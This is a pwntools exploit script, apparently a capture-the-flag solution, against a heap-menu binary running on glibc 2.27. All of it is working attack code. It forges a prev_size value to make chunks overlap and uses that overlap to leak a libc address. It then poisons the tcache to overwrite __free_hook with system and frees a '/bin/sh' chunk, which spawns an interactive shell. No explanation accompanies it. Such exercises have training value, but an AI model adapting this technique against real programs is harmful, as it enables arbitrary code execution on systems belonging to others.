from pwn import *

context.log_level = 'DEBUG'
elf = context.binary = ELF('../file/timu_2.27')

p = process('../file/timu_2.27')
libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')

pause()

def create(size, data=b'a\n'):
    p.sendlineafter(b'choice :\n', b'1')
    p.sendlineafter(b'Size: \n', str(size).encode())
    p.sendafter(b'Data: \n', data)

def delete(index):
    p.sendlineafter(b'choice :\n', b'2')
    p.sendlineafter(b'Index: \n', str(index).encode())

def show():
    p.sendlineafter(b'choice :\n', b'3')

create(0x500) # 0
create(0x600) # 1 last
create(0x18) # 2
create(0x500 - 0x10) # 3
create(0x10) # 4 last

delete(0)
delete(2)

prev_size = 0xb40
create(0x18, b'a' * 0x10 + p64(prev_size)) # 0 last
delete(3)

create(0x500) # 2 last
show()

p.recvuntil(b'1 : ')
libc.address = u64(p.recv(6).ljust(8, b'\0')) - 4111520

create(0x40) # 3 last
delete(3)
delete(1)

create(0x40, p64(libc.sym['__free_hook'] - 0x8) + b'\n') # 1 last
create(0x40) # 3 last
create(0x40, b'/bin/sh\0' + p64(libc.sym['system']) + b'\n') # 5 last

delete(5)

p.interactive()
